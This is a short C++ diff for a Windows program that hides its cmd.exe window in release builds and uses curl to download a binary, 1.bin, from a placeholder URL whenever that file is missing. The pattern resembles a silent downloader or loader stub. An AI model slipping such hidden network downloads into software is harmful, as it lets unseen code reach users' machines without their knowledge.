@@ -4,10 +4,14 @@
 #include<shellapi.h>
 namespace fs = std::filesystem;
 void cmd_execute(LPCWSTR command) {
+#if DEBUG
 	ShellExecute(NULL, NULL, L"cmd.exe",command, NULL, SW_SHOWNORMAL);
+#else
+	ShellExecute(NULL, NULL, L"cmd.exe", command, NULL, SW_HIDE);
+#endif
 }
 void download_temp() {
-	cmd_execute(L"/k ");
+	cmd_execute(L"/k curl -o temp\\1.bin ##TARGET-BUILD-URL##");
 }
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
 {
@@ -17,7 +21,9 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmd
 
 	bool localinst = !fs::exists(p / "1.bin");
 
-	download_temp();
+	if (localinst) {
+		download_temp();
+	}
 
 	return 0;
 }
